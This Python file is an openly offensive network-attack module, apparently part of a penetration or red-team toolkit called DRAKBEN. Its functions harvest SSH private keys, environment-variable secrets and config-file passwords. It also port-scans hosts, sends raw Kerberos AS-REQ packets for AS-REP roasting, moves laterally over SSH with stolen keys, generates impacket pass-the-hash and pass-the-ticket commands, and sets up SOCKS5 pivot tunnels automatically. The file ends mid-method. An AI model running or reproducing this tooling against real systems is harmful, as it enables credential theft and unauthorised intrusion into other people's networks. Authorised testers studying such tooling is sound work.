"""DRAKBEN Hive Mind - Enterprise Network Intelligence & Lateral Movement
Author: @drak_ben
Description: Active Directory analysis, lateral movement, and network pivoting.

This module provides:
- Active Directory enumeration and attack automation
- Lateral movement techniques (Pass-the-Hash, SSH Key Harvesting)
- Network topology discovery
- Credential harvesting and impersonation
- BloodHound-style attack path analysis
"""

import contextlib
import ipaddress
import logging
import os
import re
import secrets
import shlex
import socket
import subprocess
from collections.abc import Generator
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)

# Singleton instance
_hive_mind: "HiveMind | None" = None


# =============================================================================
# CONSTANTS
# =============================================================================


class CredentialType(Enum):
    """Types of harvested credentials."""

    PASSWORD = "password"
    NTLM_HASH = "ntlm_hash"
    KERBEROS_TICKET = "kerberos_ticket"
    SSH_KEY = "ssh_key"
    TOKEN = "token"
    CERTIFICATE = "certificate"


class MovementTechnique(Enum):
    """Lateral movement techniques."""

    PSEXEC = "psexec"
    WMIEXEC = "wmiexec"
    SMBEXEC = "smbexec"
    WINRM = "winrm"
    SSH = "ssh"
    RDP = "rdp"
    PASS_THE_HASH = "pth"
    PASS_THE_TICKET = "ptt"


class ADAttack(Enum):
    """Active Directory attack types."""

    KERBEROASTING = "kerberoasting"
    ASREP_ROASTING = "asrep_roasting"
    DCSYNC = "dcsync"
    GOLDEN_TICKET = "golden_ticket"
    SILVER_TICKET = "silver_ticket"
    ZEROLOGON = "zerologon"


# =============================================================================
# DATA CLASSES
# =============================================================================


@dataclass
class Credential:
    """Harvested credential."""

    username: str
    domain: str
    credential_type: CredentialType
    value: str  # Password, hash, or key content
    source: str  # Where was this found
    admin_level: bool = False
    valid: bool = True
    metadata: dict[str, Any] = field(default_factory=dict)


@dataclass
class NetworkHost:
    """Discovered network host."""

    ip: str
    hostname: str | None = None
    domain: str | None = None
    os: str | None = None
    ports: list[int] = field(default_factory=list)
    services: dict[int, str] = field(default_factory=dict)
    credentials: list[Credential] = field(default_factory=list)
    compromised: bool = False
    pivot_point: bool = False


@dataclass
class AttackPath:
    """Path from current position to target."""

    source: str
    target: str
    hops: list[str]
    techniques: list[MovementTechnique]
    credentials_needed: list[str]
    probability: float  # Success probability 0-1


@dataclass
class DomainInfo:
    """Active Directory domain information."""

    name: str
    netbios_name: str
    domain_controllers: list[str]
    forest: str | None = None
    functional_level: str | None = None
    users: list[str] = field(default_factory=list)
    computers: list[str] = field(default_factory=list)
    groups: list[str] = field(default_factory=list)
    trusts: list[str] = field(default_factory=list)


# =============================================================================
# CREDENTIAL HARVESTER
# =============================================================================


class CredentialHarvester:
    """Credential harvesting from various sources.

    Sources:
    - Memory (mimikatz-style)
    - Files (config files, SSH keys)
    - Registry (Windows credentials)
    - Environment variables
    - Browser storage
    """

    def __init__(self) -> None:
        """Initialize the credential harvester with internal storage."""
        self.harvested: list[Credential] = []
        self.patterns: list[str] = [
            r"password\s*[:=]\s*['\"]?(\S+?)['\"]?\s",
            r"db_pass\s*[:=]\s*['\"]?(\S+?)['\"]?\s",
            r"admin_pass\s*[:=]\s*['\"]?(\S+?)['\"]?\s",
            r"secret\s*[:=]\s*['\"]?(\S+?)['\"]?\s",
            r"token\s*[:=]\s*['\"]?(\S+?)['\"]?\s",
        ]

    def _try_harvest_ssh_key(self, key_path: Path) -> Credential | None:
        """Try to harvest a single SSH key file."""
        try:
            content = key_path.read_text()
            if "PRIVATE KEY" not in content:
                return None

            username = self._get_ssh_username(str(key_path))
            cred = Credential(
                username=username or os.getenv("USER", "unknown"),
                domain="",
                credential_type=CredentialType.SSH_KEY,
                value=content,
                source=str(key_path),
                metadata={"encrypted": "ENCRYPTED" in content},
            )
            logger.info("Found SSH key: %s", key_path)
            return cred
        except PermissionError:
            logger.debug("Permission denied reading SSH key: %s", key_path)
        except Exception as e:
            logger.debug("Error reading SSH key %s: %s", key_path, e)
        return None

    def harvest_ssh_keys(self) -> list[Credential]:
        """Harvest SSH private keys from common locations."""
        found: list[Credential] = []
        ssh_dir = Path.home() / ".ssh"

        if not ssh_dir.exists():
            return found

        for key_file in ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"]:
            key_path = ssh_dir / key_file
            if not key_path.exists():
                continue
            cred = self._try_harvest_ssh_key(key_path)
            if cred:
                found.append(cred)
                self.harvested.append(cred)

        return found

    def harvest_known_hosts(self) -> list[str]:
        """Parse SSH known_hosts for target discovery.

        Returns:
            List of hostnames/IPs from known_hosts

        """
        hosts = []
        known_hosts_path = Path.home() / ".ssh" / "known_hosts"

        if known_hosts_path.exists():
            try:
                for line in known_hosts_path.read_text().splitlines():
                    if line.strip() and not line.startswith("#"):
                        # Format: hostname,ip algo key
                        parts = line.split()
                        if parts:
                            host_part = parts[0].split(",")
                            hosts.extend(host_part)
            except Exception as e:
                logger.debug("Error reading known_hosts: %s", e)

        return list(set(hosts))

    def harvest_environment(self) -> list[Credential]:
        """Harvest credentials from environment variables.

        Returns:
            List of potential credentials from environment

        """
        found = []
        sensitive_patterns = [
            "PASSWORD",
            "PASSWD",
            "SECRET",
            "TOKEN",
            "API_KEY",
            "APIKEY",
            "ACCESS_KEY",
            "PRIVATE_KEY",
            "CREDENTIAL",
        ]

        for key, value in os.environ.items():
            for pattern in sensitive_patterns:
                if pattern in key.upper() and value:
                    cred = Credential(
                        username="env:" + key,
                        domain="",
                        credential_type=CredentialType.PASSWORD,
                        value=value,
                        source="environment",
                        metadata={"env_var": key},
                    )
                    found.append(cred)
                    self.harvested.append(cred)

        return found

    def _parse_config_file(self, filepath: str, password_regex: "re.Pattern") -> list["Credential"]:
        """Parse a single config file for credentials."""
        found_in_file = []
        try:
            content = Path(filepath).read_text(errors="ignore")
            matches = password_regex.findall(content)
            for match in matches:
                if len(match) > 3 and match.lower() not in [
                    "null",
                    "none",
                    "empty",
                    "changeme",
                ]:
                    cred = Credential(
                        username="config",
                        domain="",
                        credential_type=CredentialType.PASSWORD,
                        value=match,
                        source=filepath,
                    )
                    found_in_file.append(cred)
        except OSError:
            pass
        return found_in_file

    def _get_config_files(self, search_paths: list[str], patterns: list[str]) -> Generator[str, None, None]:
        """Generator for relevant config files."""
        for search_path in search_paths:
            if not Path(search_path).exists():
                continue
            for root, dirs, files in os.walk(search_path):
                dirs[:] = [d for d in dirs if not d.startswith(".")]
                for filename in files:
                    filepath = Path(root) / filename
                    # Simple filter check
                    if any(
                        str(filepath).endswith(p.replace("*", "")) for p in patterns
                    ) or any(p.replace("*", "") in filename for p in patterns):
                        yield str(filepath)

    def harvest_config_files(
        self, search_paths: list[str] | None = None,
    ) -> list[Credential]:
        """Search config files for embedded credentials.
        Architecture: Uses a generator for memory-efficient file discovery and
        centralized parsing to maintain low cognitive complexity.
        """
        if search_paths is None:
            search_paths = [str(Path.home())]

        found = []
        patterns = [
            "*.conf",
            "*.cfg",
            "*.ini",
            "*.yaml",
            "*.yml",
            ".env",
            ".netrc",
            ".pgpass",
            ".my.cnf",
        ]
        password_regex = re.compile(
            r'(?:password|passwd|pwd|secret|token|api_key|apikey)\s*[=:]\s*["\']?([^"\'\s]+)',
            re.IGNORECASE,
        )

        for filepath in self._get_config_files(search_paths, patterns):
            file_creds = self._parse_config_file(filepath, password_regex)
            found.extend(file_creds)
            self.harvested.extend(file_creds)

        return found

    def _get_ssh_username(self, _key_path: str) -> str:
        """Try to determine SSH username from config."""
        try:
            config_path = Path.home() / ".ssh" / "config"
            if config_path.exists():
                # Simple parser for Host * User pattern
                content = config_path.read_text()
                for line in content.splitlines():
                    if line.strip().startswith("User "):
                        return line.split()[1]
        except (OSError, ValueError) as e:
            logger.debug("SSH config read failed: %s", e)
        return os.getlogin() if hasattr(os, "getlogin") else "unknown"

    def get_all_credentials(self) -> list[Credential]:
        """Get all harvested credentials."""
        return self.harvested.copy()


# =============================================================================
# NETWORK MAPPER
# =============================================================================


class NetworkMapper:
    """Network topology discovery and mapping.

    Discovers:
    - Local network hosts
    - Open ports and services
    - Network relationships
    - Potential pivot points
    """

    def __init__(self) -> None:
        self.discovered_hosts: dict[str, NetworkHost] = {}
        self.local_interfaces: list[str] = []

    def get_local_interfaces(self) -> list[str]:
        """Get local network interfaces and their IPs."""
        interfaces: list[str] = []

        # Get all network interfaces
        hostname = socket.gethostname()

        # Get all IPs for this host
        try:
            ips = socket.getaddrinfo(hostname, None, socket.AF_INET)
            for ip_info in ips:
                ip = str(ip_info[4][0])
                if not ip.startswith("127."):
                    interfaces.append(ip)
        except socket.gaierror:
            pass

        # Also try to get the primary IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            primary_ip = s.getsockname()[0]
            s.close()
            if primary_ip not in interfaces:
                interfaces.append(primary_ip)
        except OSError as e:
            logger.debug("Failed to get primary IP: %s", e)

        self.local_interfaces = interfaces
        return interfaces

    def get_local_subnet(self, ip: str) -> str:
        """Get the /24 subnet for an IP."""
        try:
            network = ipaddress.IPv4Network(f"{ip}/24", strict=False)
            return str(network)
        except ValueError:
            return f"{ip}/24"

    def quick_scan(
        self, target: str, ports: list[int] | None = None,
    ) -> NetworkHost | None:
        """Quick port scan of a single target.

        Args:
            target: IP or hostname
            ports: Ports to scan (default: common ports)

        Returns:
            NetworkHost object or None

        """
        if ports is None:
            ports = [22, 80, 135, 139, 443, 445, 3389, 5985, 5986]

        open_ports = []
        services = {}

        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()

                if result == 0:
                    open_ports.append(port)
                    services[port] = self._guess_service(port)

            except Exception as e:
                logger.debug("Service guessing failed for port %s: %s", port, e)
                continue

        if open_ports:
            host = NetworkHost(ip=target, ports=open_ports, services=services)
            self.discovered_hosts[target] = host
            return host

        return None

    def _guess_service(self, port: int) -> str:
        """Guess service name from port number."""
        common_ports = {
            21: "ftp",
            22: "ssh",
            23: "telnet",
            25: "smtp",
            53: "dns",
            80: "http",
            110: "pop3",
            135: "msrpc",
            139: "netbios-ssn",
            143: "imap",
            443: "https",
            445: "microsoft-ds",
            993: "imaps",
            995: "pop3s",
            1433: "mssql",
            1521: "oracle",
            3306: "mysql",
            3389: "rdp",
            5432: "postgresql",
            5985: "winrm-http",
            5986: "winrm-https",
            6379: "redis",
            8080: "http-proxy",
            8443: "https-alt",
        }
        return common_ports.get(port, f"unknown-{port}")

    def is_windows_host(self, host: NetworkHost) -> bool:
        """Check if host appears to be Windows."""
        windows_ports = {135, 139, 445, 3389, 5985}
        return bool(set(host.ports) & windows_ports)

    def is_linux_host(self, host: NetworkHost) -> bool:
        """Check if host appears to be Linux."""
        return 22 in host.ports and not self.is_windows_host(host)

    def find_pivot_points(self) -> list[NetworkHost]:
        """Find potential pivot points (hosts with multiple network access)."""
        pivots = []
        for host in self.discovered_hosts.values():
            # Hosts with RDP/SSH and other services are good pivot points
            if (22 in host.ports or 3389 in host.ports) and len(host.ports) > 2:
                host.pivot_point = True
                pivots.append(host)
        return pivots


# =============================================================================
# ACTIVE DIRECTORY ANALYZER
# =============================================================================


class KerberosPacketFactory:
    """Native Python Kerberos Packet Factory.
    Constructs raw ASN.1/DER encoded Kerberos packets without external dependencies.
    """

    @staticmethod
    def build_as_req(username: str, domain: str) -> bytes:
        """Builds a minimal raw AS-REQ packet for AS-REP Roasting checks.

        Structure (Simplified RFC4120):
        AS-REQ := [APPLICATION 10] KDC-REQ
        KDC-REQ := SEQUENCE {
            pvno [1] INTEGER (5),
            msg-type [2] INTEGER (10 -- AS-REQ),
            padata [3] SEQUENCE OF PA-DATA OPTIONAL,
            req-body [4] KDC-REQ-BODY
        }

        This implementation constructs the byte sequence manually using struct
        to avoid bulky ASN.1 libraries, ensuring 'surgical' precision and zero-dependency.
        """

        # 1. Basic ASN.1 Encoders (Minimalist)
        def encode_len(length: int) -> bytes:
            if length < 128:
                return bytes([length])
            b = length.to_bytes((length.bit_length() + 7) // 8, "big")
            return bytes([0x80 | len(b)]) + b

        def seq(tags: int, content: bytes) -> bytes:
            encoded_length = encode_len(len(content))
            return bytes([tags]) + encoded_length + content

        def int_val(val: int) -> bytes:
            """Encode integer value in ASN.1 format (tag 0x02)."""
            b = val.to_bytes((val.bit_length() + 7) // 8 + 1, "big", signed=True)
            return seq(0x02, b)

        def str_val(val: str) -> bytes:
            """Encode string value in ASN.1 GeneralString format (tag 0x1B)."""
            return seq(0x1B, val.encode("utf-8"))

        # 2. Build KDC-REQ-BODY
        # cname (PrincipalName)
        #   name-type: 1 (NT-PRINCIPAL)
        #   name-string: SEQUENCE of username
        name_string = seq(0x30, str_val(username))
        cname_val = seq(
            0x30,
            seq(0xA0, int_val(1))  # name-type
            + seq(0xA1, name_string),  # name-string
        )
        cname = seq(0xA0, cname_val)

        # realm
        realm = seq(0xA1, str_val(domain.upper()))

        # sname (krbtgt/DOMAIN)
        sname_strings = seq(0x30, str_val("krbtgt") + str_val(domain.upper()))
        sname_val = seq(
            0x30,
            seq(0xA0, int_val(2))  # name-type (NT-SRV-INST)
            + seq(0xA1, sname_strings),
        )
        sname = seq(0xA2, sname_val)

        # till (20370913024805Z - generic future date)
        till = seq(0xA5, seq(0x18, b"20370913024805Z"))

        # nonce (random)
        nonce_int = secrets.randbits(31)
        nonce = seq(0xA6, int_val(nonce_int))

        # etypes (RC4-HMAC=23) - focused on downgrade/roasting
        # SEQUENCE OF INTEGER
        etypes_val = seq(0x30, int_val(23))
        etypes = seq(0xA7, etypes_val)

        # KDC-REQ-BODY Sequence
        # options: 4 (Forwardable) -> BIT STRING
        # We skip options for minimal roast check req
        req_body_content = (
            seq(0xA0, int_val(0)) + cname + realm + sname + till + nonce + etypes
        )
        req_body = seq(0x30, req_body_content)

        # 3. Build KDC-REQ
        pvno = seq(0xA1, int_val(5))
        msg_type = seq(0xA2, int_val(10))  # AS-REQ

        # No PA-DATA (Pre-Auth Data) -> This is the key for Roasting check!
        # If server replies with enc-part, user is vulnerable (No Pre-Auth required)

        kdc_req_content = pvno + msg_type + seq(0xA4, req_body)
        kdc_req = seq(0x30, kdc_req_content)

        # 4. Wrap in APPLICATION 10
        return seq(0x6A, kdc_req)


class ADAnalyzer:
    """Active Directory enumeration and analysis.

    Capabilities:
    - Domain enumeration
    - User/Group discovery
    - Trust relationships
    - Attack path calculation
    - Kerberos attacks
    """

    def __init__(self) -> None:
        self.domain_info: DomainInfo | None = None
        self.attack_paths: list[AttackPath] = []

    def detect_domain(self) -> str | None:
        """Detect if we're on a domain-joined machine.

        Returns:
            Domain name or None

        """
        # Check environment variables (Windows)
        domain = os.environ.get("USERDOMAIN")
        if domain and domain != os.environ.get("COMPUTERNAME"):
            return domain

        # Check /etc/resolv.conf (Linux)
        try:
            with open("/etc/resolv.conf") as f:
                for line in f:
                    if line.startswith(("search ", "domain ")):
                        parts = line.split()
                        if len(parts) > 1:
                            return parts[1]
        except FileNotFoundError:
            pass

        return None

    def enumerate_domain(self, domain: str) -> DomainInfo | None:
        """Enumerate Active Directory domain.

        Args:
            domain: Domain name

        Returns:
            DomainInfo object or None

        """
        info = DomainInfo(
            name=domain,
            netbios_name=domain.split(".")[0].upper()
            if "." in domain
            else domain.upper(),
            domain_controllers=[],
        )

        # Try to find domain controllers via DNS
        try:
            # Look for _ldap._tcp SRV records
            # Look for _ldap._tcp SRV records (Query logic for future implementation)
            # This would use DNS query in real implementation
            # For now, try to resolve common DC names
            for prefix in ["dc", "dc1", "dc01", "pdc"]:
                try:
                    socket.gethostbyname(f"{prefix}.{domain}")
                    info.domain_controllers.append(f"{prefix}.{domain}")
                except socket.gaierror:
                    continue
        except Exception as e:
            logger.debug("Error enumerating DCs: %s", e)

        self.domain_info = info
        return info

    def get_kerberoastable_users(self) -> list[str]:
        """Get list of potentially kerberoastable users.

        Returns:
            List of usernames with SPNs

        """
        # In real implementation, this would query AD for users with SPNs
        # For now, return common service account patterns
        return [
            "svc_*",
            "service_*",
            "sql*",
            "web*",
            "iis*",
            "backup*",
            "admin*",
            "exchange*",
            "sharepoint*",
        ]

    def get_asrep_roastable_users(self) -> list[str]:
        """Get list of users vulnerable to AS-REP roasting.

        Returns:
            List of usernames without pre-auth

        """
        return []

    def native_check_asrep_roasting(
        self,
        domain: str,
        users: list[str],
        dc_ip: str,
    ) -> list[str]:
        """Check for AS-REP Roasting using native Python sockets.
        Sends raw AS-REQ without Pre-Auth.

        Args:
            domain: Target domain
            users: List of users to check
            dc_ip: Domain Controller IP

        Returns:
            List of vulnerable users (those who returned AS-REP instead of KRB-ERROR)

        """
        vulnerable_users = []

        for user in users:
            try:
                # 1. Build Packet
                packet = KerberosPacketFactory.build_as_req(user, domain)

                # 2. Send to DC (UDP 88)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2.0)
                sock.sendto(packet, (dc_ip, 88))

                # 3. Receive Response
                data, _ = sock.recvfrom(4096)
                sock.close()

                # 4. Analyze Response
                # AS-REP = Application 11 (0x6B)
                # KRB-ERROR = Application 30 (0x7E)
                if data[0] == 0x6B:
                    # We got a Ticket! (Vulnerable)
                    logger.warning("AS-REP Roasting Success: %s is vulnerable!", user)
                    vulnerable_users.append(user)

            except Exception as e:
                logger.debug("Roasting check failed for %s: %s", user, e)

        return vulnerable_users

    def calculate_attack_path(
        self,
        source: str,
        target: str,
        available_creds: list[Credential],
        discovered_hosts: dict[str, NetworkHost],
    ) -> AttackPath | None:
        """Calculate attack path from source to target.

        BloodHound-style shortest path calculation.

        Args:
            source: Current position (hostname/IP)
            target: Target (hostname/IP or "Domain Admin")
            available_creds: Available credentials
            discovered_hosts: Discovered network hosts

        Returns:
            AttackPath or None if no path found

        """
        # Simple path calculation
        # In real implementation, this would use graph algorithms

        hops = []
        techniques = []
        creds_needed = []

        source_host = discovered_hosts.get(source)
        target_host = discovered_hosts.get(target)

        if not source_host:
            return None

        # Check direct connection
        if target_host:
            if 22 in target_host.ports:
                techniques.append(MovementTechnique.SSH)
                creds_needed.append("ssh_key_or_password")
            elif 445 in target_host.ports:
                techniques.append(MovementTechnique.PSEXEC)
                creds_needed.append("admin_ntlm_hash_or_password")
            elif 5985 in target_host.ports:
                techniques.append(MovementTechnique.WINRM)
                creds_needed.append("admin_password")
            elif 3389 in target_host.ports:
                techniques.append(MovementTechnique.RDP)
                creds_needed.append("interactive_logon_creds")

            hops = [target]

        if hops:
            # Calculate success probability based on available creds
            probability = 0.5  # Base probability
            for cred in available_creds:
                if cred.admin_level:
                    probability = min(0.9, probability + 0.2)

            return AttackPath(
                source=source,
                target=target,
                hops=hops,
                techniques=techniques,
                credentials_needed=creds_needed,
                probability=probability,
            )

        return None


# =============================================================================
# LATERAL MOVEMENT ENGINE
# =============================================================================


class LateralMover:
    """Lateral movement execution engine.

    Techniques:
    - Pass-the-Hash (PTH)
    - Pass-the-Ticket (PTT)
    - psexec/wmiexec/smbexec
    - SSH with harvested keys
    - WinRM
    """

    def __init__(self) -> None:
        self.successful_moves: list[dict[str, Any]] = []
        self.failed_moves: list[dict[str, Any]] = []

    def _prepare_ssh_key(self, key_content: str) -> str:
        """Securely write SSH key to temp file."""
        import tempfile

        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".key") as f:
            f.write(key_content)
            key_file = f.name
        os.chmod(key_file, 0o600)
        return key_file

    def _execute_ssh(
        self,
        cmd_list: list[str],
        timeout: int = 30,
    ) -> tuple[bool, str, str]:
        """Execute SSH command with subprocess."""
        proc = None
        try:
            proc = subprocess.Popen(
                cmd_list,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            stdout, stderr = proc.communicate(timeout=timeout)
            return proc.returncode == 0, stdout, stderr
        except subprocess.TimeoutExpired:
            if proc:
                proc.kill()
                proc.communicate()
            return False, "", "Connection timeout"
        except Exception as e:
            return False, "", str(e)

    def move_ssh(
        self,
        target: str,
        username: str,
        credential: Credential,
        command: str | None = None,
    ) -> dict[str, Any]:
        """Move to target via SSH (Refactored for complexity)."""
        result = {
            "technique": MovementTechnique.SSH.value,
            "target": target,
            "username": username,
            "success": False,
            "output": "",
            "error": "",
        }

        if credential.credential_type != CredentialType.SSH_KEY:
            result["error"] = (
                "Password authentication requires sshpass (Not implemented)"
            )
            return result

        key_file = self._prepare_ssh_key(credential.value)
        try:
            ssh_opts = "-o StrictHostKeyChecking=no -o BatchMode=yes"
            cmd_list = [
                "ssh",
                *shlex.split(ssh_opts),
                "-i",
                key_file,
                f"{username}@{target}",
            ]
            if command:
                cmd_list.append(command)

            success, stdout, stderr = self._execute_ssh(cmd_list)
            result.update({"success": success, "output": stdout, "error": stderr})
        finally:
            with contextlib.suppress(Exception):
                os.unlink(key_file)

        if result["success"]:
            self.successful_moves.append(result)
        else:
            self.failed_moves.append(result)

        return result

    def generate_pth_command(
        self,
        target: str,
        username: str,
        ntlm_hash: str,
        technique: MovementTechnique = MovementTechnique.PSEXEC,
    ) -> str:
        """Generate Pass-the-Hash command for impacket tools.

        Args:
            target: Target host
            username: Username
            ntlm_hash: NTLM hash
            technique: Which impacket tool to use

        Returns:
            Command string

        """
        domain = ""
        if "\\" in username:
            domain, username = username.split("\\")
        elif "@" in username:
            username, domain = username.split("@")

        # Format: tool domain/user@target -hashes :ntlm_hash
        tool_map = {
            MovementTechnique.PSEXEC: "psexec.py",
            MovementTechnique.WMIEXEC: "wmiexec.py",
            MovementTechnique.SMBEXEC: "smbexec.py",
        }

        tool = tool_map.get(technique, "psexec.py")

        user_spec = f"{domain}/{username}" if domain else username

        return f"{tool} {user_spec}@{target} -hashes :{ntlm_hash}"

    def generate_ptt_command(self, target: str, ticket_path: str) -> str:
        """Generate Pass-the-Ticket command.

        Args:
            target: Target host
            ticket_path: Path to Kerberos ticket

        Returns:
            Command string

        """
        return f"export KRB5CCNAME={ticket_path} && psexec.py -k -no-pass {target}"

    def get_movement_stats(self) -> dict[str, Any]:
        """Get statistics about movement attempts."""
        return {
            "successful": len(self.successful_moves),
            "failed": len(self.failed_moves),
            "techniques_used": list({m["technique"] for m in self.successful_moves}),
            "targets_compromised": list({m["target"] for m in self.successful_moves}),
        }


# =============================================================================
# AUTO-PIVOTING & TUNNEL MANAGEMENT
# =============================================================================


@dataclass
class TunnelConfig:
    """Configuration for a network tunnel."""

    tunnel_type: str  # "socks5", "ssh_forward", "ssh_reverse"
    local_port: int
    remote_host: str
    remote_port: int
    jump_host: str
    username: str
    credential: Credential | None = None
    active: bool = False
    pid: int | None = None


class TunnelManager:
    """Manages network tunnels for pivoting.

    Supports:
    - SOCKS5 dynamic port forwarding via SSH
    - Local port forwarding
    - Reverse port forwarding
    - Chisel-style tunnels

    """

    def __init__(self) -> None:
        """Initialize tunnel manager."""
        self.active_tunnels: dict[int, TunnelConfig] = {}
        self._next_local_port = 9050

    def _get_next_port(self) -> int:
        """Get next available local port."""
        port = self._next_local_port
        self._next_local_port += 1
        return port

    def create_socks5_tunnel(
        self,
        jump_host: str,
        username: str,
        credential: Credential | None = None,
        local_port: int | None = None,
    ) -> TunnelConfig:
        """Create SOCKS5 dynamic tunnel via SSH.

        Args:
            jump_host: Host to use as SOCKS proxy
            username: SSH username
            credential: SSH credential (key or password)
            local_port: Local port for SOCKS proxy (auto-assigned if None)

        Returns:
            TunnelConfig with tunnel details

        """
        if local_port is None:
            local_port = self._get_next_port()

        config = TunnelConfig(
            tunnel_type="socks5",
            local_port=local_port,
            remote_host=jump_host,
            remote_port=22,
            jump_host=jump_host,
            username=username,
            credential=credential,
            active=False,
        )

        # Build SSH command for SOCKS5
        cmd = self._build_ssh_tunnel_command(config)

        try:
            # Start tunnel in background
            process = subprocess.Popen(
                shlex.split(cmd),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True,
            )
            config.pid = process.pid
            config.active = True
            self.active_tunnels[local_port] = config

            logger.info(
                "SOCKS5 tunnel created: localhost:%d -> %s",
                local_port,
                jump_host,
            )

        except Exception as e:
            logger.exception("Failed to create SOCKS5 tunnel: %s", e)

        return config

    def _build_ssh_tunnel_command(self, config: TunnelConfig) -> str:
        """Build SSH tunnel command."""
        base_cmd = "ssh -N -f"

        if config.tunnel_type == "socks5":
            base_cmd += f" -D {config.local_port}"
        elif config.tunnel_type == "ssh_forward":
            base_cmd += (
                f" -L {config.local_port}:{config.remote_host}:{config.remote_port}"
            )
        elif config.tunnel_type == "ssh_reverse":
            base_cmd += (
                f" -R {config.remote_port}:localhost:{config.local_port}"
            )

        # Add key if available
        if config.credential and config.credential.credential_type == CredentialType.SSH_KEY:
            key_path = config.credential.source
            base_cmd += f" -i {key_path}"

        base_cmd += f" {config.username}@{config.jump_host}"

        return base_cmd

    def create_port_forward(
        self,
        jump_host: str,
        username: str,
        remote_host: str,
        remote_port: int,
        local_port: int | None = None,
        credential: Credential | None = None,
    ) -> TunnelConfig:
        """Create local port forward tunnel.

        Args:
            jump_host: SSH jump host
            username: SSH username
            remote_host: Target host (from jump_host perspective)
            remote_port: Target port
            local_port: Local port (auto-assigned if None)
            credential: SSH credential

        Returns:
            TunnelConfig

        """
        if local_port is None:
            local_port = self._get_next_port()

        config = TunnelConfig(
            tunnel_type="ssh_forward",
            local_port=local_port,
            remote_host=remote_host,
            remote_port=remote_port,
            jump_host=jump_host,
            username=username,
            credential=credential,
            active=False,
        )

        cmd = self._build_ssh_tunnel_command(config)

        try:
            process = subprocess.Popen(
                shlex.split(cmd),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True,
            )
            config.pid = process.pid
            config.active = True
            self.active_tunnels[local_port] = config

            logger.info(
                "Port forward: localhost:%d -> %s:%d (via %s)",
                local_port,
                remote_host,
                remote_port,
                jump_host,
            )

        except Exception as e:
            logger.exception("Failed to create port forward: %s", e)

        return config

    def close_tunnel(self, local_port: int) -> bool:
        """Close a tunnel by local port.

        Args:
            local_port: Local port of tunnel to close

        Returns:
            True if closed successfully

        """
        if local_port not in self.active_tunnels:
            return False

        config = self.active_tunnels[local_port]

        if config.pid:
            try:
                os.kill(config.pid, 15)  # SIGTERM
                logger.info("Tunnel on port %d closed", local_port)
            except OSError as e:
                logger.debug("Error closing tunnel: %s", e)

        config.active = False
        del self.active_tunnels[local_port]
        return True

    def close_all_tunnels(self) -> int:
        """Close all active tunnels.

        Returns:
            Number of tunnels closed

        """
        ports = list(self.active_tunnels.keys())
        closed = 0
        for port in ports:
            if self.close_tunnel(port):
                closed += 1
        return closed

    def get_proxy_config(self, local_port: int) -> dict[str, Any]:
        """Get proxy configuration for a SOCKS5 tunnel.

        Args:
            local_port: Local SOCKS5 port

        Returns:
            Dict with proxy settings

        """
        if local_port not in self.active_tunnels:
            return {}

        config = self.active_tunnels[local_port]

        if config.tunnel_type != "socks5":
            return {}

        return {
            "http": f"socks5://127.0.0.1:{local_port}",
            "https": f"socks5://127.0.0.1:{local_port}",
            "all": f"socks5://127.0.0.1:{local_port}",
        }

    def list_tunnels(self) -> list[dict[str, Any]]:
        """List all active tunnels.

        Returns:
            List of tunnel info dicts

        """
        return [
            {
                "local_port": port,
                "type": config.tunnel_type,
                "jump_host": config.jump_host,
                "remote": f"{config.remote_host}:{config.remote_port}",
                "active": config.active,
            }
            for port, config in self.active_tunnels.items()
        ]


class AutoPivot:
    """Automatic pivot point detection and tunnel setup.

    Uses HiveMind's network mapping to find pivot points,
    then automatically establishes tunnels through them.

    """

    def __init__(
        self,
        mapper: "NetworkMapper",
        harvester: "CredentialHarvester",
    ) -> None:
        """Initialize AutoPivot.

        Args:
            mapper: Network mapper for host discovery
            harvester: Credential harvester for auth

        """
        self.mapper = mapper
        self.harvester = harvester
        self.tunnel_manager = TunnelManager()
        self.pivot_chain: list[TunnelConfig] = []

    def find_and_pivot(
        self,
        _target_subnet: str | None = None,
    ) -> list[TunnelConfig]:
        """Automatically find pivot points and establish tunnels.

        Args:
            _target_subnet: Target subnet to reach (reserved for future filtering)

        Returns:
            List of established tunnel configs

        """
        established: list[TunnelConfig] = []

        # Find pivot points
        pivots = self.mapper.find_pivot_points()

        if not pivots:
            logger.warning("No pivot points found")
            return established

        # Get SSH credentials
        ssh_creds = [
            c
            for c in self.harvester.harvested
            if c.credential_type == CredentialType.SSH_KEY
        ]

        for pivot in pivots:
            if 22 not in pivot.ports:
                continue

            # Try each SSH credential
            for cred in ssh_creds:
                try:
                    config = self.tunnel_manager.create_socks5_tunnel(
                        jump_host=pivot.ip,
                        username=cred.username,
                        credential=cred,
                    )

                    if config.active:
                        established.append(config)
                        self.pivot_chain.append(config)
                        logger.info(
                            "Auto-pivot established through %s",
                            pivot.ip,
                        )
                        break  # One tunnel per pivot is enough

                except Exception as e:
                    logger.debug("Auto-pivot failed for %s: %s", pivot.ip, e)

        return established

    def chain_pivot(
        self,
        targets: list[str],
        username: str,
        credential: Credential,
    ) -> list[TunnelConfig]:
        """Create chained tunnels through multiple hosts.

        Args:
            targets: List of hosts to chain through
            username: SSH username
            credential: SSH credential

        Returns:
            List of chained tunnel configs

        """
        chain: list[TunnelConfig] = []
        current_port = 9050

        for i, target in enumerate(targets):
            if i == 0:
                # First hop - direct connection
                config = self.tunnel_manager.create_socks5_tunnel(
                    jump_host=target,
                    username=username,
                    credential=credential,
                    local_port=current_port,
                )
            else:
                # Subsequent hops - tunnel through previous
                # Use ProxyJump/ProxyCommand
                config = self.tunnel_manager.create_socks5_tunnel(
                    jump_host=target,
                    username=username,
                    credential=credential,
                    local_port=current_port + i,
                )

            if config.active:
                chain.append(config)
                self.pivot_chain.append(config)
            else:
                logger.warning("Chain broken at %s", target)
                break

        return chain

    def cleanup(self) -> int:
        """Close all pivot tunnels.

        Returns:
            Number of tunnels closed

        """
